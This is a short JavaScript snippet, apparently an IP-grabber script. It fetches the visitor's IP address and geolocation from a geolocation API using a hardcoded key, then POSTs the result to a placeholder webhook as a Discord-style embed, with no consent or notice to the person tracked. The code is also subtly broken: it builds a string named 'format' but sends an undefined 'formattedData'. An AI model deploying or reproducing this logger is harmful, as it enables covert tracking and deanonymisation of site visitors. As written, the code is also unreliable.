function ip_logger() {
  fetch("https://api.ipgeolocation.io/ipgeo?apiKey=7da767cf7b924c76b78bd4a15cc590e9")
    .then(response => response.json())
    .then(data => {
      let ipInfo = {};
      for (const item in data) {
        if (item === "currency") {
          break;
        }
        ipInfo[item] = data[item];
        delete data[item];
      }
      data.ip_info = ipInfo;
      if (data.ip_info.country_flag) {
        delete data.ip_info.country_flag;
      }
      let format = "";
      for (const key in data) {
        if (typeof data[key] === "object" && data[key] !== null) {
          format += key + ":\n";
          for (const subKey in data[key]) {
            format += "	" + subKey + ": " + data[key][subKey] + "\n";
          }
          format += "\n";
        } else {
          format += key + ": " + data[key] + "\n";
        }
      }
      fetch("web-hook-here", {
        method: "POST", 
        headers: {"Content-Type": "application/json"}, 
        body: JSON.stringify({embeds: [{title: "I'm Bored", description: "```json\n" + formattedData + "\n```", color: 3066993}]})
      });
    })
    .catch(console.error);
}
